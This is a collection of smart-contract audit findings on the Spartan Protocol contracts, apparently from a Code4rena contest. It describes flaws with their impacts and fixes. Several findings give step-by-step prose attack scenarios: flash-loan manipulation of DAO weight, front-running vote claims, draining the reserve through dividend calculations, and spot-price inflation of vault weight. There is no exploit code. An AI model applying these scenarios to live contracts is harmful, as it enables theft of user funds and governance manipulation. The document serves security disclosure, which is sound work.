# Handle  shw   # Vulnerability details  ## Impact  The `getPoolShareWeight` function returns a user's pool share weight by calculating how many SPARTAN the user's LP tokens account for. However, this approach is vulnerable to flash loan manipulation since an attacker can swap a large number of TOKEN to SPARTAN to increase the number of SPARTAN in the pool, thus effectively increasing his pool share weight.  ## Proof of Concept  According to the implementation of `getPoolShareWeight,` a user's pool share weight is calculated by `uints * baseAmount / totalSupply`, where `uints` is the number of user's LP tokens, `totalSupply` is the total supply of LP tokens, and `baseAmount` is the number of SPARTAN in the pool. Thus, a user's pool share weight is proportional to the number of SPARTAN in the pool. Consider the following attack scenario:  1. Supposing the attacked pool is SPARTAN-WBNB. The attacker first prepares some LP tokens (WBNB-SPP) by adding liquidity to the pool. 2. The attacker then swaps a large number of WBNB to SPARTAN, which increases the pool's `baseAmount`. He could split his trade into small amounts to reduce slip-based fees. 3. The attacker now wants to increase his weight in the `DaoVault`. He adds his LP tokens to the pool by calling the `deposit` function of `Dao.` 4. `Dao` then calls `depositLP` of `DaoVault`, causing the attacker's weight to be recalculated. Due to the large proportion of SPARTAN in the pool, the attacker's weight is artificially increased. 5. With a higher member weight, the attacker can, for example, vote the current proposal with more votes than he should have or obtain more rewards when calling `harvest` of the `Dao` contract. 6. The attacker then swaps back SPARTAN to WBNB and only loses the slip-based fees.  Referenced code: [Utils.sol#L46-L50](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L46-L50) [Utils.sol#L70-L77](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L70-L77) [DaoVault.sol#L44-L56](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/DaoVault.sol#L44-L56) [Dao.sol#L201](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L201) [Dao.sol#L570](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L570)  ## Recommended Mitigation Steps  A possible mitigation is to record the current timestamp when a user's weight in the `DaoVault` or `BondVault` is recalculated and force the new weight to take effect only after a certain period, e.g., a block time. This would prevent the attacker from launching the attack since there is typically no guarantee that he could arbitrage the WBNB back in the next block.  
# Handle  shw   # Vulnerability details  ## Impact  The `claimAllForMember` function of `Dao` is permissionless, allowing anyone to claim the unlocked bonded LP tokens for any member. However, claiming a member's LP tokens could decrease the member's weight in the `BondVault`, thus affecting the member's votes and rewards in the `Dao` contract.   ## Proof of Concept  For example, an attacker can intentionally front-run a victim's `voteProposal` call to decrease the victim's vote weight to prevent the proposal from being finalized:  1. Supposing the victim's member weight in the `BondVault` is 201, the total weight is 300. The victim has some LP tokens claimable from the vault, and if claimed, the victim's weight will be decreased to 101. To simplify the situation, assuming that the victim's weight in the `DaoVault` and the total weight of the `DaoVault` are both 0. 2. The victim wants to vote on the current proposal, which requires the majority consensus. If the victim calls `voteProposal`, the proposal will be finalized since the victim has the majority weight (201/300 > 66.6%). 3. An attacker does not want the proposal to be finalized, so he calls `claimAllForMember` with the victim as the parameter to intentionally decrease the victim's weight. 4. As a result, the victim's weight is decreased to 101, and the total weight is decreased to 200. The victim cannot finalize the proposal since he has no majority anymore (101/200 < 66.6%).  Similarly, an attacker can front-run a victim's `harvest` call to intentionally decrease the victim's reward since the amount of reward is calculated based on the victim's current weight.  Referenced code: [Dao.sol#L179-L206](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L179-L206) [Dao.sol#L276-L285](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L276-L285) [Dao.sol#L369-L383](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L369-L383) [Dao.sol#L568-L574](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L568-L574) [Dao.sol#L577-L586](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L577-L586) [BondVault.sol#L104-L117](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/BondVault.sol#L104-L117) [BondVault.sol#L120-L129](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/BondVault.sol#L120-L129) [BondVault.sol#L155-L162](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/BondVault.sol#L155-L162)  ## Recommended Mitigation Steps  Consider removing the `member` parameter in the `claimAllForMember` function and replace all `member` to `msg.sender` to allow only the user himself to claim unlocked bonded LP tokens.  
# Handle  shw   # Vulnerability details  ## Impact  Several functions in `Utils` do not handle edge cases where the divisor is 0, caused mainly by no liquidity in the pool. In such cases, the transactions revert without returning a proper error message.  ## Proof of Concept  Referenced code: [Utils.sol#L75](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L75) [Utils.sol#L90](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L90) [Utils.sol#L109-L110](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L109-L110) [Utils.sol#L123-L124](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L123-L124) [Utils.sol#L131](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L131) [Utils.sol#L138](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L138) [Utils.sol#L155](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L155) [Utils.sol#L189](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L189) [Utils.sol#L195](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L195) [Utils.sol#L215](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L215)  ## Recommended Mitigation Steps  Check if the divisors are 0 in the above functions to handle edge cases.  
# Handle  0xsanson   # Vulnerability details  ## Impact In Router.sol, the function addLiquidityForMember() doesn't check inputBase and inputToken. Since we know they can't both be zero (it wouldn't change anything and user pays the gas for nothing).  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Router.sol#L51  ## Tools Used editor  ## Recommended Mitigation Steps Consider adding a require `inputBase>0 || inputToken>0`.  
# Handle  0xsanson   # Vulnerability details  ## Impact In Router.sol, there's a loss of precision that can be corrected by shifting the operations.  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Router.sol#L274  ## Tools Used editor  ## Recommended Mitigation Steps Consider rewriting L274-275 with `uint numerator = (_fees * reserve) / eraLength / maxTrades;`.  
# Handle  0xsanson   # Vulnerability details  ## Impact zapLiquidity() in Router.sol misses an input validation unitsInput > 0.  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Router.sol#L59  ## Tools Used editor  ## Recommended Mitigation Steps Add an input validation for unitsInput.  
# Handle  JMukesh   # Vulnerability details  ## Impact https://docs.soliditylang.org/en/v0.8.6/contracts.html#constant-and-immutable-state-variables  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Utils.sol#L11  ## Tools Used  manual review  ## Recommended Mitigation Steps   
# Handle  JMukesh   # Vulnerability details  ## Impact  https://docs.soliditylang.org/en/v0.8.6/contracts.html#constant-and-immutable-state-variables  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L15  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L14  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L18  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L7 https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L12  ## Tools Used  manual review  ## Recommended Mitigation Steps  
# Handle  0xsanson   # Vulnerability details  ## Impact In Synth.sol, the function burnSynth() calculates a division between two variables. Since they can be zero, it's better to have a require with a clear error message when the division is not possible, otherwise an user wouldn't know why a transaction reverted.  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Synth.sol#L176  ## Tools Used editor  ## Recommended Mitigation Steps Add a require(denom != 0, "LPDebt = 0").  
# Handle  0xsanson   # Vulnerability details  ## Impact In synthFactory.sol, there's an `event CreateSynth(address indexed token, address indexed pool)`. However the event is emitted with "synth" as second output.  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/synthFactory.sol#L13 https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/synthFactory.sol#L46  ## Tools Used editor  ## Recommended Mitigation Steps Think about what's the better variable to be emitted, and correct one of the lines.  
# Handle  heiho1   # Vulnerability details  ## Impact  Pool.burnSynth(address,address) is potentially a reentrant method because it executes transfers and burning before updating balances/metrics.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L245  ## Tools Used  Slither  ## Recommended Mitigation Steps  The function should update state before external calls.  Consider using a nonReentrant guard as provided by OpenZeppelin:  https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard  
# Handle  cmichel   # Vulnerability details  The `Router.addDividend` function tells the reserve to send dividends to the pool depending on the fees.  - The attacker provides LP to a curated pool. Ideally, they become a large LP holder to capture most of the profit, they should choose the smallest liquidity pool as the dividends are pool-independent. - The `normalAverageFee` variable that determines the pool dividends can be set to zero by the attacker by trading a single wei in the pool `arrayFeeSize` (20) times (use `buyTo`). The fees of the single wei trades will be zero and thus the `normalAverageFee` will also be zero as, see `addTradeFee`. - The attacker then does a trade that generates some non-zero fees, setting the `normalAverageFee` to this trade's fee. The `feeDividend` is then computed as `_fees * dailyAllocation / (_fees + normalAverageFee) = _fees * dailyAllocation / (2 * _fees) = dailyAllocation / 2`. Half of the `dailyAllocation` is sent to the pool. - The attacker repeats the above steps until the reserve is almost empty. Each time the `dailyAllocation` gets smaller but it's still possible to withdraw almost all of it. - They redeem their LP tokens and gain a share of the profits  ## Impact The reserve can be emptied by the attacker.  ## Recommended Mitigation Steps Counting only the last 20 trades as a baseline for the dividends does not work. It should probably average over a timespan but even that can be gamed if it is too short. I think a better idea is to compute the dividends based on **volume** traded over a timespan instead of looking at individual trades.   
# Handle  cmichel   # Vulnerability details  ## Vulnerability Details  The `SynthVault.withdraw` function does not claim the user's rewards. It decreases the user's weight and therefore they are forfeiting their accumulated rewards. The `synthReward` variable in `_processWithdraw` is also never used - it was probably intended that this variable captures the claimed rewards.  ## Impact Usually, withdrawal functions claim rewards first but this one does not. A user that withdraws loses all their accumulated rewards.  ## Recommended Mitigation Steps Claim the rewards with the user's deposited balance first in `withdraw`.   
# Handle  cmichel   # Vulnerability details  ## Vulnerability Details  The `SynthVault.harvestSingle` function can be used to mint & deposit synths without using a lockup. An attacker sends `BASE` tokens to the pool and then calls `harvestSingle`. The inner `iPOOL(_poolOUT).mintSynth(synth, address(this));` call will mint synth tokens to the vault based on the total `BASE` balance sent to the pool, including the attacker's previous transfer. They are then credited the entire amount to their `weight`.  This essentially acts as a (mint +) deposit without a lock-up period.  ## Recommended Mitigation Steps Sync the pool before sending `BASE` to it through `iRESERVE(_DAO().RESERVE()).grantFunds(reward, _poolOUT);` such that any previous `BASE` transfer is wasted. This way only the actual reward's weight is increased.  
# Handle  cmichel   # Vulnerability details  ## Vulnerability Details  The `SynthVault._deposit` function adds `weight` for the user that depends on the spot value of the deposit synth amount in `BASE`. This spot price can be manipulated and the cost of manipulation is relative to the pool's liquidity. However, the reward (see `calcReward`) is measured in BASE tokens unrelated to the pool. Therefore, if the pool's liquidity is low and the reward reserve is high, the attack can be profitable:  1. Manipulate the pool spot price of the `iSYNTH(_synth).LayerONE()` pool by dripping a lot of `BASE` into it repeatedly (sending lots of smaller trades is less costly due to the [path-independence of the continuous liquidity model](https://docs.thorchain.org/thorchain-finance/continuous-liquidity-pools)). This increases the `BASE` per `token` price. 2. Call `SynthVault.depositForMember` and deposit a _small_ amount of synth token. The `iUTILS(_DAO().UTILS()).calcSpotValueInBase(iSYNTH(_synth).LayerONE(), _amount)` will return an inflated weight due to the price. 3. Optionally drip more `BASE` into the pool and repeat the deposits 4. Drip back `token` to the pool to rebalance it  The user's `weight` is now inflated compared to the deposited / locked-up amount and they can claim a large share of the rewards.  ## Impact The cost of the attack depends on the pool's liquidity and the profit depends on the reserve. It could therefore be profitable under certain circumstances.  ## Recommended Mitigation Steps Track a TWAP price of the synth instead, store the deposited synths instead, and compute the weight & total weight on the fly based on the TWAP * deposit amount instead of at the time of deposit.  
# Handle  cmichel   # Vulnerability details  ## Vulnerability Details The `Synth._transfer` function does not check if `recipient != 0`. Unlike standard ERC20, tokens can be accidentally burned this way.  ## Recommended Mitigation Steps Prevent user errors by denying transfers to the zero address and forcing them to call `burn` instead.  
# Handle  cmichel   # Vulnerability details  ## Vulnerability Details  The protocol differentiates between public pool creations and private ones (starting without liquidity). However, this is not effective as anyone can just flashloan the required initial pool liquidity, call `PoolFactory.createPoolADD`, receive the LP tokens in `addForMember` and withdraw liquidity again.  ## Recommended Mitigation Steps Consider burning some initial LP tokens or taking a pool creation fee instead.   
# Handle  maplesyrup   # Vulnerability details  ## Impact Gas optimizations Does not affect the contract in any harmful way. Suggestions allow for smart contract gas optimizations.  ## Proof of Concept According to Slither analyzer documentation (https://github.com/crytic/slither/wiki/Detector-Documentation#state-variables-that-could-be-declared-constant), the variable in contract Utils.sol called "one" or Utils.one can be set to a constant as it is considered a variable that does not change throughout the contract.   Slither Detectors:  constable-states:  Utils.one (contracts/Utils.sol, lines#11) should be constant  ------------  Code in contract:  uint public one = 10**18; <---- can be constant as it does not change  --------------  Console output (via Slither in JSON format):    "constable-states": [     "Utils.one (contracts/Utils.sol#11) should be constant\n"   ],  ## Tools Used  Spartan Contracts Solidity (v 0.8.3) Slither Analyzer (v 0.8.0)  ## Recommended Mitigation Steps  1. Clone repository for Spartan Smart Contracts 2. Create a python virtual environment with a stable python version 3. Install Slither Analyzer on the python VEM 4. Run Slither against all contracts  
# Handle  maplesyrup   # Vulnerability details  ## Impact  Gas Optimization This does not directly impact the smart contract in anyway besides cost. This is a gas optimization to reduce cost of smart contract.  ## Proof of Concept According to Slither Analyzer documentation (https://github.com/crytic/slither/wiki/Detector-Documentation#public-function-that-could-be-declared-external), there are functions in the contract that are never called. These functions should be declared as external in order to save gas.   Slither Detector:  external-function:  purgeDeployer() should be declared external:  BondVault.purgeDeployer() (contracts/BondVault.sol, lines#50-52)  -----------------------  Console output (via Slither in JSON format):  "external-function": [     "purgeDeployer() should be declared external:\n\t- BondVault.purgeDeployer() (contracts/BondVault.sol#50-52)\n",     "hasMinority(uint256) should be declared external:\n\t- Dao.hasMinority(uint256) (contracts/Dao.sol#601-610)\n",     "ROUTER() should be declared external:\n\t- Dao.ROUTER() (contracts/Dao.sol#615-621)\n",     "UTILS() should be declared external:\n\t- Dao.UTILS() (contracts/Dao.sol#624-630)\n",     "BONDVAULT() should be declared external:\n\t- Dao.BONDVAULT() (contracts/Dao.sol#633-639)\n",     "DAOVAULT() should be declared external:\n\t- Dao.DAOVAULT() (contracts/Dao.sol#642-648)\n",     "POOLFACTORY() should be declared external:\n\t- Dao.POOLFACTORY() (contracts/Dao.sol#651-657)\n",     "SYNTHFACTORY() should be declared external:\n\t- Dao.SYNTHFACTORY() (contracts/Dao.sol#660-666)\n",     "RESERVE() should be declared external:\n\t- Dao.RESERVE() (contracts/Dao.sol#669-675)\n",     "SYNTHVAULT() should be declared external:\n\t- Dao.SYNTHVAULT() (contracts/Dao.sol#678-684)\n",     "greet() should be declared external:\n\t- Greeter.greet() (contracts/Greeter.sol#15-17)\n",     "setGreeting(string) should be declared external:\n\t- Greeter.setGreeting(string) (contracts/Greeter.sol#19-22)\n"   ]  ## Tools Used  Spartan Contracts Solidity (v 0.8.3) Slither Analyzer (v 0.8.0)  ## Recommended Mitigation Steps  1. Clone repository for Spartan Smart Contracts 2. Create a python virtual environment with a stable python version 3. Install Slither Analyzer on the python VEM 4. Run Slither against all contracts  
# Handle  0xRajeev   # Vulnerability details  ## Impact  addCuratedPool() is missing a require(isCuratedPool[_pool] == false) check, similar to the one in removeCuratedPool to ensure that the DAO is not trying to curate an already curated pool which indicates a mismatch of assumption/accounting compared to the contract state.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L79-L87  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L93   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Add require(isCuratedPool[_pool] == false) before setting isCuratedPool[_pool] = true.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  The token argument used in CreatePool event emit of createPoolADD() should really be _token so that WBNB address is logged in the event instead of zero address when token == 0. Logging a zero address could confuse off-chain user interfaces because it is treated as a burn address by convention.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L60  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L49   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Use _token instead of token in event emit.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  When a member calls removeLiquiditySingle() requesting only SPARTA in return, i.e. toBASE = true, the LP tokens are transferred to the Pool to withdraw the constituent SPARTA and TOKENs back to the Router. The withdrawn TOKENs are then transferred back to the Pool to convert to SPARTA and directly transferred to the member from the Pool. However, the member’s SPARTA are left behind in the Router instead of being returned along with converted SPARTA from the Pool.   In other words, the _member's BASE SPARTA tokens that were removed from the Pool along with the TOKENs are never sent back to the _member because the _token's transferred to the Pool are converted to SPARTA and only those are sent back to member directly from the Pool via swapTo().   This effectively results in member losing the SPARTA component of their Pool LP tokens which get left behind in the Router and are possibly claimed by future transactions that remove SPARTA from Router.  ## Proof of Concept  LPs sent to Pool: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L121  SPARTA and TOKENs withdrawn from Pool to Router: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L122  TOKENs from Router sent to Pool: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L126  TOKENs in Pool converted to BASE SPARTA and sent to member directly from the Pool: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L127   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  1. BASE SPARTA should also be transferred to the Pool before swapTo() so they get sent to the member along with the converted TOKENs via swapTo() 2. Use swap(BASE) instead of swapTo() so that TOKENs are swapped for BASE SPARTA in Pool and sent back to ROUTER. Then send all the SPARTA from ROUTER to member.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  The _handleTransferIn() functions use a conditional check (_amount > 0) to execute the transfer-in logic of tokens. This should really be a require() to prevent zero amount transfers into the protocol which will allow subsequent logic to execute and potentially utilize any dust/stuck funds from earlier to be accounted to the sender.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L198-L210  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L202-L206  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L110-L114  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Change condition check to a require() which will revert any transfers of zero tokens/funds.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  This isListedPool check implemented by isPool() is missing in many functions of the contract that accept pool/token addresses from users. getPool() returns the default mapping value of 0 for token that do not have valid pools. This lack of input validation may lead to use of zero/invalid pool addresses in the protocol context and reverts in the best case or burn/loss of user funds in the worst case.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L119-L133  Use of getPool() without isPool() check: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/BondVault.sol#L108  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L52  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L81  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L139  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L155  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L175  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L232  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L247-L248  Several usages of getPool() in Utils.sol and other places.  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Combine isPool() isListedPool check to getPool() so that it always returns a valid/listed pool in the protocol.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  The threshold check for basisPoints while a required part of input validation is an unnecessary redundant check because calcPart() does a similar upper bound check and the lower bound check on 0 is only an optimization.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L95  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Utils.sol#L65   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Remove redundant check to save gas and improve readability/maintainability.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  _token is conditionally set (to WBNB) but never used in addLiquiditySingleForMember() function unlike its usage in other functions. Such usage typically indicates missing/incorrect functionality. It looks like _handleTransferIn checks token == 0 again to consider BNB.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L83  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Recommend re-evaluating _token usage in this function, adding any missing logic or removing it for readability/maintainability.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  zapLiquidity() used to trade LP tokens of one pool to another is missing a check for toPool != fromPool which may happen accidentally. The check will prevent unnecessary transfers and avoid any fees/slippage or accounting errors.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L58-L71   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Add toPool != fromPool as part of input validation.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  An attacker can front-run any operation that depends on the pool contract's internal balance amounts being unsynced to pool's balance on token/base contracts effectively nullifying the transfer of base/tokens for those operations. This will make _getAddedBaseAmount() and _getAddedTokenAmount() return 0 (because the balances are synced) from such operations.   Impact: The affected operations are: addForMember(), swapTo() and mintSynth() which will all take the user funds to respective contracts but will treat it as 0 (because of the syncing) and thus not add liquidity, return swapped tokens or mint any synths to the affected users. User loses deposited funds to the contract.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L308-L312  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L261-L270  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L272-L281  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L216-L220  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L231  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L174-L175  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L279  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Add access control to sync() function so that only Router can call it via addDividend().  
# Handle  0xRajeev   # Vulnerability details  ## Impact  Incorrect event parameter outputAmount is used (instead of output) in the MintSynth event emit. outputAmount is a named return variable that is never set in this function and so will always be 0. This should instead be output. This will confuse the UI or offchain monitoring tools that 0 synths were minted and will lead to users panicking/complaining or trying to mint synth again.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L240  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L229  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L232  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Replace outputAmount with output in the emit.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  If moveDAO() is executed after voting, the existing DAO contract continues to function as before whereas it should ideally cease to function/exist from the users’ perspective or at least function as a clone of the new DAO by using the same addresses as it does.  Scenario: moveDAO is executed to make DAO and BASE.DAO point to the new address. Existing DAO contract continues to function but all the other interfacing contracts (ROUTER, UTILS, DAOVAULT, BONDVAULT, SYNTHVAULT, POOLFACTORY, SYNTHFACTORY and RESERVE) use the updated DAO address as updated in BASE. At a minimum, this leads to undefined behavior and at worst an attack where the old DAOs (there could be many) are exploited because it still points to valid router, pool and vault contracts.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L451-L459   changeDAO: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/outside-scope/Sparta.sol#L189-L193   Use of BASE.DAO: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/BondVault.sol#L54-L57  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/DaoVault.sol#L32-L34  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L39-L41  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L41-L43  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L20-L22  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L20-L22  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Utils.sol#L29-L31  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L35-L37  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthFactory.sol#L27-L29  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L45-L47  Updated Getters: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L614-L684  Example uses of stale interface contract addresses _* instead of using Dao(DAO).* versions: _ROUTER: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L259  _BONDVAULT: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L281  _UTILS: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L205  _RESERVE: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L188  etc.  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  At a minimum, all DAO public/external functions should check and revert if daoHasMoved or the design can even consider a selfdestruct to destroy the DAO contract once it has successfully handed over to the new DAO contract and all pending actions have been cleared. In the unlikely requirement of older DAO contracts continuing to exist, they should at least use addresses of interfacing contracts as reported by the new DAO which could have updated them.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  Event log poisoning is possible by griefing attackers who have no DAO weight but vote and emit event that takes up event log space.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L382  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L393   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Emit event only if non-zero weight as relevant to proposal voting/cancelling.  
